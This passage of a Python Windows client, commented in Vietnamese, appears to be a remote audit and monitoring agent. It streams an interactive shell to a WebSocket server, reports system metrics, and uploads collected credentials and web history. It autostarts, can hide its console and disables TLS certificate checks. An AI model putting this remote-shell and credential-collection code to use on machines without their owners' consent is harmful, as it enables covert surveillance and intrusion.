                            terminal_process = subprocess.Popen(
                                shell,
                                stdin=subprocess.PIPE,
                                stdout=subprocess.PIPE,
                                stderr=subprocess.STDOUT,
                                text=True,
                                bufsize=0,
                                creationflags=flags
                            )
                            def read_output(proc, ws, loop):
                                try:
                                    while proc.poll() is None:
                                        char = proc.stdout.read(1)
                                        if not char:
                                            break
                                        asyncio.run_coroutine_threadsafe(
                                            ws.send(json.dumps({
                                                "type": "remote_response",
                                                "command": "terminal_stream",
                                                "guid": CLIENT_GUID,
                                                "result": {"output": char}
                                            })),
                                            loop
                                        )
                                except: pass
                            loop = asyncio.get_event_loop()
                            threading.Thread(target=read_output, args=(terminal_process, websocket, loop), daemon=True).start()
                            response_data["result"] = {"success": True}
                        except Exception as e:
                            response_data["result"] = {"success": False, "error": str(e)}
                        await websocket.send(json.dumps(response_data))

                    elif command_type == 'terminal_input':
                        if terminal_process and terminal_process.poll() is None:
                            input_data = data.get('payload', '')
                            terminal_process.stdin.write(input_data)
                            terminal_process.stdin.flush()
                        else:
                            response_data["result"] = {"error": "Terminal not running"}
                            await websocket.send(json.dumps(response_data))

                    elif command_type == 'terminal_stop':
                        if terminal_process:
                            try:
                                terminal_process.terminate()
                                terminal_process.wait(timeout=2)
                            except: pass
                            terminal_process = None
                        response_data["result"] = {"success": True}
                        await websocket.send(json.dumps(response_data))

                    print(f"[REMOTE] Sent response for {command_type}")
            except Exception as e:
                print(f"[REMOTE] Error processing message: {e}")
                
    except websockets.exceptions.ConnectionClosed:
        pass
    except Exception as e:
        print(f"[REMOTE] Listener task error: {e}")

async def send_metrics(websocket):
    """Gửi các chỉ số hiệu năng (CPU, RAM, Disk, và I/O chi tiết) định kỳ."""
    config = load_config_file(os.path.join(get_base_path(), 'config.ini'))
    metrics_send_interval = int(config['client']['refesh_interval'])
    try:
        while True:
            # Thu thập các metrics cơ bản
            cpu_usage = WindowsAuditor._Usage.get_cpu_usage()
            ram_usage = WindowsAuditor._Usage.get_ram_usage()
            disk_usage = WindowsAuditor._Usage.get_disk_usage() # Giữ nguyên hàm cũ
            local_ip = WindowsAuditor._Ip.get_local_ip()
            wan_ip = WindowsAuditor._Ip.get_wan_ip()
            
            # Thu thập các metrics I/O chi tiết (blocking)
            loop = asyncio.get_running_loop()
            disk_io = await loop.run_in_executor(None, WindowsAuditor._Usage.get_disk_io_per_disk)
            network_io = await loop.run_in_executor(None, WindowsAuditor._Usage.get_network_io_per_nic)

            metrics = {
                "type": "metrics", "guid": CLIENT_GUID,
                "cpu_usage": cpu_usage,
                "ram_usage": ram_usage,
                "disk_usage": disk_usage, # Giá trị số đơn giản
                "disk_io": disk_io,       # Dict of dicts (bytes/s)
                "network_io": network_io, # Dict of dicts (bits/s)
                "local_ip": local_ip,
                "wan_ip": wan_ip,
            }
            await websocket.send(json.dumps(metrics))
            
            print(
                f"[SEND] => Metrics: CPU: {cpu_usage:.1f}% | RAM: {ram_usage:.1f}% | Disk: {disk_usage:.1f}% | "
                f"Disk I/O points: {len(disk_io)} | Net I/O points: {len(network_io)}"
            )
            # print(json.dumps(metrics, indent=4))
            
            # Đợi cho chu kỳ gửi tiếp theo
            await asyncio.sleep(metrics_send_interval)
            
    except asyncio.CancelledError:
        print("Metrics sending task cancelled.")
    except websockets.exceptions.ConnectionClosed:
        pass
    except Exception as e:
        print(f"Metrics sending task: An unexpected error occurred: {e}")

async def send_updated_audit_and_info(websocket):
    """
    Tác vụ chạy nền để gửi lại thông tin và dữ liệu audit định kỳ.
    Ưu tiên gửi info trước để server nhận diện, sau đó mới chạy audit nặng.
    """
    config = load_config_file(os.path.join(get_base_path(), 'config.ini'))
    update_interval = int(config['client']['update_info_interval'])
    access_token = config['client'].get('access_token', config['client'].get('token', ''))
    if not access_token and config.has_section('server'):
        access_token = config['server'].get('access_token', config['server'].get('token', ''))

    try:
        while True:
            # 1. Gửi gói tin info NGAY LẬP TỨC để server biết client đã online
            local_ip = WindowsAuditor._Ip.get_local_ip()
            wan_ip = WindowsAuditor._Ip.get_wan_ip()
            enabled_modules = get_enabled_modules_from_config()
            info = {
                "type": "client_info", "guid": CLIENT_GUID, "hostname": HOSTNAME,
                "username": USERNAME, "local_ip": local_ip, "wan_ip": wan_ip,
                "enabled_modules": enabled_modules,
                "version": CLIENT_VERSION,
                "supports_chunk": True,
                "access_token": access_token
            }
            await websocket.send(json.dumps(info))
            print(f"\n[SEND] => Sent client info update.")

            # 2. Chạy audit nặng dưới nền (không block việc gửi metrics realtime)
            print("[AUDIT] Running full system audit in background...")
            loop = asyncio.get_running_loop()
            current_audit_data = await loop.run_in_executor(None, run_full_audit_sync)

            # 3. Mã hóa dữ liệu nhạy cảm trước khi gửi
            if current_audit_data:
                sensitive_modules = ['credentials', 'web_history']
                for mod in sensitive_modules:
                    if mod in current_audit_data and "Error" not in current_audit_data[mod]:
                        print(f"[CRYPTO] Encrypting module '{mod}'...")
                        raw_json = json.dumps(current_audit_data[mod])
                        encrypted_data = WindowsAuditor._Crypto.encrypt(raw_json, access_token)
                        current_audit_data[mod] = {"encrypted": True, "payload": encrypted_data}

                audit_report = {
                    "type": "full_audit", "guid": CLIENT_GUID, "data": current_audit_data
                }
                await websocket.send(json.dumps(audit_report))
                print("[SEND] => Sent full audit report (sensitive data encrypted).")
            # 4. Chờ cho lần cập nhật tiếp theo (ví dụ 60 giây)
            print(f"       Next info/audit update in {update_interval} seconds.\n")
            await asyncio.sleep(update_interval)

    except asyncio.CancelledError:
        print("Info/Audit sending task cancelled.")
    except websockets.exceptions.ConnectionClosed:
        pass
    except Exception as e:
        print(f"Info/Audit sending task: An unexpected error occurred: {e}")


# --- Quản lý Trạng thái và Cấu hình Client (Ctrl + F11) ---
active_websocket = None
reconnect_event = None
connection_status_text = "Đang khởi tạo kết nối..."
root_config_window = None
config_window_lock = threading.Lock()

def trigger_immediate_reconnect():
    """Kích hoạt kết nối lại ngay lập tức khi người dùng lưu cấu hình mới."""
    global active_websocket, main_event_loop, reconnect_event
    print("[CONFIG] Triggering immediate reconnect with updated configuration...")
    try:
        if reconnect_event and main_event_loop and main_event_loop.is_running():
            main_event_loop.call_soon_threadsafe(reconnect_event.set)
    except Exception as e:
        print(f"[CONFIG] Error signaling reconnect_event: {e}")

    try:
        if active_websocket and main_event_loop and main_event_loop.is_running():
            asyncio.run_coroutine_threadsafe(_safe_close_ws(active_websocket), main_event_loop)
    except Exception as e:
        print(f"[CONFIG] Error closing active websocket: {e}")

class ClientConfigDialog:
    """Giao diện Tinh gọn: Chức năng DUY NHẤT chỉnh sửa địa chỉ WebSocket kết nối Client -> Server (Ctrl + F11)."""
    def __init__(self, master, config_path, on_save_callback=None):
        self.master = master
        self.config_path = config_path
        self.on_save_callback = on_save_callback
        ensure_default_config(self.config_path)
        
        # Kiểm tra chế độ mã hóa của config (bảo toàn ENC: nếu có)
        self.is_encrypted = False
        if os.path.exists(self.config_path):
            try:
                with open(self.config_path, "r", encoding="utf-8") as f:
                    if f.read().strip().startswith("ENC:"):
                        self.is_encrypted = True
            except Exception:
                pass

        self.config = load_config_file(self.config_path)

        self.master.title("Cấu hình Kết nối Server (Ctrl + F11)")
        self.master.geometry("460x260")
        self.master.resizable(False, False)

        import tkinter as tk
        from tkinter import ttk, messagebox

        # Thiết lập giao diện native
        style = ttk.Style(self.master)
        for th in ['vista', 'xpnative', 'clam']:
            if th in style.theme_names():
                style.theme_use(th)
                break

        default_font = ("Segoe UI", 9)
        self.master.option_add("*Font", default_font)

        # Căn giữa cửa sổ trên màn hình
        self.master.update_idletasks()
        w = 460
        h = 260
        x = max(0, (self.master.winfo_screenwidth() // 2) - (w // 2))
        y = max(0, (self.master.winfo_screenheight() // 2) - (h // 2))
        self.master.geometry(f"{w}x{h}+{x}+{y}")

        self._build_ui(tk, ttk, messagebox)

    def _build_ui(self, tk, ttk, messagebox):
        main_frame = ttk.Frame(self.master, padding=(16, 14))
        main_frame.pack(fill="both", expand=True)

        # Header
        header_frame = ttk.Frame(main_frame)
        header_frame.pack(fill="x", pady=(0, 10))

        title_label = ttk.Label(header_frame, text="Địa Chỉ WebSocket Server", font=("Segoe UI", 11, "bold"))
        title_label.pack(anchor="w")

        sub_label = ttk.Label(
            header_frame, 
            text="Chỉnh sửa địa chỉ kết nối WebSocket máy chủ (Phím tắt: Ctrl + F11)",
            foreground="#555555"
        )
        sub_label.pack(anchor="w", pady=(2, 0))

        # Status Box
        curr_server = self.config['client'].get('server', '127.0.0.1') if self.config.has_section('client') else '127.0.0.1'
        curr_port = self.config['server'].get('port', '9630') if self.config.has_section('server') else '9630'

        status_frame = ttk.LabelFrame(main_frame, text="Trạng thái Hiện tại", padding=(10, 6))
        status_frame.pack(fill="x", pady=(0, 12))

        ttk.Label(
            status_frame, 
            text=f"URI: ws://{curr_server}:{curr_port}   |   {connection_status_text}", 
            foreground="#0055bb",
            font=("Segoe UI", 9, "bold")
        ).pack(anchor="w")

        # Input Frame (Chỉ chứa Host/IP và Port)
        input_frame = ttk.LabelFrame(main_frame, text="Thiết lập Địa chỉ Mới", padding=10)
        input_frame.pack(fill="x", pady=(0, 15))
        input_frame.columnconfigure(1, weight=3)
        input_frame.columnconfigure(3, weight=1)

        ttk.Label(input_frame, text="Server (IP / Host):").grid(row=0, column=0, sticky="w", padx=(0, 6), pady=4)
        self.var_server = tk.StringVar(value=curr_server)
        self.entry_server = ttk.Entry(input_frame, textvariable=self.var_server)
        self.entry_server.grid(row=0, column=1, sticky="ew", padx=(0, 12), pady=4)

        ttk.Label(input_frame, text="Port:").grid(row=0, column=2, sticky="w", padx=(0, 6), pady=4)
        self.var_port = tk.StringVar(value=curr_port)
        self.entry_port = ttk.Entry(input_frame, textvariable=self.var_port, width=8)
        self.entry_port.grid(row=0, column=3, sticky="w", pady=4)

        # Buttons
        btn_frame = ttk.Frame(main_frame)
        btn_frame.pack(fill="x", side="bottom")

        self.btn_cancel = ttk.Button(btn_frame, text="Hủy (Esc)", command=self.master.destroy)
        self.btn_cancel.pack(side="right", padx=(6, 0))

        self.btn_save = ttk.Button(btn_frame, text="💾 Lưu & Kết Nối Lại (Enter)", command=lambda: self._save_and_reconnect(messagebox))
        self.btn_save.pack(side="right")

        # Phím Enter để lưu nhanh, Esc để hủy
        self.master.bind("<Return>", lambda e: self._save_and_reconnect(messagebox))
        self.master.bind("<Escape>", lambda e: self.master.destroy())
        self.entry_server.focus_set()
        self.entry_server.select_range(0, tk.END)

    def _save_and_reconnect(self, messagebox):
        raw_server = self.var_server.get().strip()
        raw_port = self.var_port.get().strip()

        if not raw_server:
            messagebox.showerror("Lỗi", "Địa chỉ server WebSocket không được để trống!")
            return

        # Hỗ trợ thông minh: tự động phân tách nếu người dùng dán ws://ip:port hoặc ip:port
        parsed_server = raw_server
        parsed_port = raw_port
        if "://" in parsed_server:
            parsed_server = parsed_server.split("://", 1)[1]
        if "/" in parsed_server:
            parsed_server = parsed_server.split("/", 1)[0]
        if ":" in parsed_server:
            parts = parsed_server.split(":", 1)
            parsed_server = parts[0].strip()
            if parts[1].strip().isdigit():
                parsed_port = parts[1].strip()

        if not parsed_port.isdigit() or not (1 <= int(parsed_port) <= 65535):
            messagebox.showerror("Lỗi", "Cổng kết nối phải là số hợp lệ từ 1 đến 65535!")
            return

        if not self.config.has_section('client'): self.config.add_section('client')
        if not self.config.has_section('server'): self.config.add_section('server')

        self.config['client']['server'] = parsed_server
        self.config['server']['port'] = parsed_port

        # 1. Lưu cấu hình vào config.ini
        try:
            success = save_config(self.config_path, self.config, encrypt=self.is_encrypted)
            if not success:
                raise RuntimeError("Hàm save_config trả về False.")
        except Exception as e:
            messagebox.showerror("Lỗi Lưu Cấu Hình", f"Không thể ghi cấu hình vào file: {e}")
            return

        # 2. Thông báo thành công
        msg = (
            f"Đã cập nhật địa chỉ máy chủ thành công!\n\n"
            f"Client đang ngắt kết nối cũ và kết nối ngay tới:\n"
            f"ws://{parsed_server}:{parsed_port}"
        )
        messagebox.showinfo("Thành công", msg)
        # 3. Kích hoạt kết nối lại độc lập (tránh lỗi đóng socket ảnh hưởng tới việc lưu)
        try:
            if self.on_save_callback:
                self.on_save_callback()
        except Exception as e:
            print(f"[RECONNECT] Callback error: {e}")

        # 4. Đóng cửa sổ
        try:
            self.master.destroy()
        except Exception:
            pass


def open_config_gui():
    """Mở cửa sổ cấu hình Client. Đảm bảo chỉ có một cửa sổ duy nhất hiển thị."""
    global root_config_window
    with config_window_lock:
        if root_config_window is not None:
            try:
                root_config_window.after(0, lambda: (
                    root_config_window.deiconify(),
                    root_config_window.lift(),
                    root_config_window.focus_force()
                ))
                return
            except Exception:
                root_config_window = None

    def _gui_runner():
        global root_config_window
        import tkinter as tk
        try:
            root = tk.Tk()
            root_config_window = root
            config_path = os.path.join(get_base_path(), "config.ini")
            app = ClientConfigDialog(
                root, config_path, 
                on_save_callback=trigger_immediate_reconnect
            )
            def on_close():
                global root_config_window
                with config_window_lock:
                    root_config_window = None
                root.destroy()

            root.protocol("WM_DELETE_WINDOW", on_close)
            root.lift()
            root.attributes('-topmost', True)
            root.after_idle(root.attributes, '-topmost', False)
            root.focus_force()
            root.mainloop()
        except Exception as e:
            print(f"[GUI ERROR] Error in config window: {e}")
        finally:
            with config_window_lock:
                root_config_window = None

    threading.Thread(target=_gui_runner, daemon=True, name="ClientConfigGUIThread").start()


def start_hotkey_listener():
    """Khởi động luồng lắng nghe phím nóng Ctrl + F11 toàn cục trên Windows."""
    if platform.system() != "Windows":
        return

    def listener_thread():
        MOD_CONTROL = 0x0002
        MOD_NOREPEAT = 0x4000
        VK_F11 = 0x7A
        WM_HOTKEY = 0x0312
        HOTKEY_ID = 9001

        user32 = ctypes.windll.user32
        registered = user32.RegisterHotKey(None, HOTKEY_ID, MOD_CONTROL | MOD_NOREPEAT, VK_F11)
        if not registered:
            registered = user32.RegisterHotKey(None, HOTKEY_ID, MOD_CONTROL, VK_F11)

        if registered:
            print("[HOTKEY] Đã đăng ký phím nóng Ctrl + F11 thành công. Nhấn Ctrl + F11 để chỉnh sửa cấu hình kết nối.")
        else:
            print("[HOTKEY] Cảnh báo: Không thể đăng ký phím nóng Ctrl + F11 (có thể do tiến trình khác đang dùng).")
            return

        msg = wintypes.MSG()
        try:
            while user32.GetMessageW(ctypes.byref(msg), None, 0, 0) != 0:
                if msg.message == WM_HOTKEY and msg.wParam == HOTKEY_ID:
                    print("[HOTKEY] Nhận tổ hợp phím Ctrl + F11 -> Mở bảng cấu hình...")
                    open_config_gui()
                user32.TranslateMessage(ctypes.byref(msg))
                user32.DispatchMessageW(ctypes.byref(msg))
        finally:
            user32.UnregisterHotKey(None, HOTKEY_ID)

    t = threading.Thread(target=listener_thread, daemon=True, name="HotkeyListenerThread")
    t.start()


# --- Vòng lặp kết nối chính ---
async def connect():
    """
    Vòng lặp chính để kết nối và quản lý các tác vụ của client.
    Tự động đọc lại cấu hình mới khi người dùng chỉnh sửa qua Ctrl + F11.
    """
    global active_websocket, main_event_loop, reconnect_event, connection_status_text
    main_event_loop = asyncio.get_running_loop()
    reconnect_event = asyncio.Event()

    base_path = get_base_path()
    config_path = os.path.join(base_path, 'config.ini')

    while True:
        config = load_config_file(config_path)
        raw_server = config['client'].get('server', 'localhost').strip()
        server_port = int(config['server'].get('port', 9630) if config.has_section('server') else 9630)
        retry_interval = int(config['client'].get('retry_interval', 5))
        use_ssl = config.getboolean('client', 'use_ssl', fallback=False)

        # Chuẩn hóa URI và nhận diện giao thức ws / wss
        if raw_server.startswith("wss://"):
            uri = raw_server if ":" in raw_server.replace("wss://", "") else f"{raw_server}:{server_port}"
            is_ssl = True
        elif raw_server.startswith("ws://"):
            uri = raw_server if ":" in raw_server.replace("ws://", "") else f"{raw_server}:{server_port}"
            is_ssl = use_ssl
            if is_ssl:
                uri = uri.replace("ws://", "wss://")
        else:
            protocol = "wss" if use_ssl else "ws"
            uri = f"{protocol}://{raw_server}:{server_port}"
            is_ssl = use_ssl

        ssl_context = None
        if is_ssl:
            import ssl
            ssl_context = ssl.create_default_context()
            # Mạng LAN nội bộ thường dùng self-signed cert hoặc kết nối qua IP
            ssl_context.check_hostname = False
            ssl_context.verify_mode = ssl.CERT_NONE

        reconnect_event.clear()

        try:
            connection_status_text = f"Đang kết nối tới {uri}..."
            print(f"Attempting to connect to {uri}...")
            async with websockets.connect(uri, ssl=ssl_context, max_size=100 * 1024 * 1024) as websocket:
                active_websocket = websocket
                connection_status_text = f"Đã kết nối thành công ({uri})"
                print(f"Connection successful!")

                # Bắt đầu các tác vụ chạy song song:
                info_audit_task = asyncio.create_task(send_updated_audit_and_info(websocket))
                metrics_task = asyncio.create_task(send_metrics(websocket))
                remote_task = asyncio.create_task(listen_for_remote_commands(websocket))

                done, pending = await asyncio.wait(
                    [info_audit_task, metrics_task, remote_task],
                    return_when=asyncio.FIRST_COMPLETED,
                )

                for task in pending:
                    task.cancel()

        except (ConnectionRefusedError, socket.error):
            connection_status_text = f"Không thể kết nối tới {uri}"
            print(f"Server at {uri} is unreachable. Retrying in {retry_interval} seconds...")
        except websockets.exceptions.ConnectionClosed as e:
            if getattr(e, 'code', None) == 4001:
                connection_status_text = "Lỗi xác thực: Sai Access Token!"
                print(f"[AUTH ERROR] Token xác thực không khớp với Server (Code: 4001). Vui lòng kiểm tra lại token trong config.ini!")
            else:
                connection_status_text = f"Mất kết nối tới {uri}"
                print(f"Connection to server lost (Code: {getattr(e, 'code', 'N/A')}). Retrying in {retry_interval} seconds...")
        except KeyboardInterrupt:
            print("Client disconnected by user.")
            break
        except Exception as e:
            connection_status_text = f"Lỗi kết nối: {e}"
            print(f"An unexpected connection error: {e}. Retrying in {retry_interval} seconds...")
        finally:
            active_websocket = None

        # Chờ retry_interval giây HOẶC kết nối lại ngay lập tức nếu nhận tín hiệu từ Ctrl + F11
        try:
            await asyncio.wait_for(reconnect_event.wait(), timeout=retry_interval)
            reconnect_event.clear()
            print("[RECONNECT] Nhận tín hiệu kết nối lại ngay lập tức!")
        except asyncio.TimeoutError:
            pass


if __name__ == "__main__":
    # Thiết lập thư mục làm việc về thư mục chứa script
    os.chdir(get_base_path())

    if "-minimized" in sys.argv:
        hide_console()

    if platform.system() != "Windows":
        print("Warning: This client is designed for Windows and may have limited functionality on other OS.")

    # Khởi tạo file cấu hình mặc định nếu chưa tồn tại
    ensure_default_config(os.path.join(get_base_path(), "config.ini"))

    # 0. Đảm bảo chỉ có một instance chạy
    ensure_single_instance()

    # Xử lý cấu hình autostart
    manage_autostart()

    # Khởi động lắng nghe phím nóng Ctrl + F11
    start_hotkey_listener()

    # 1. Bắt đầu vòng lặp kết nối (Audit sẽ chạy sau khi kết nối thành công)
    try:
        asyncio.run(connect())
    except KeyboardInterrupt:
        print("\nClient shutdown.")
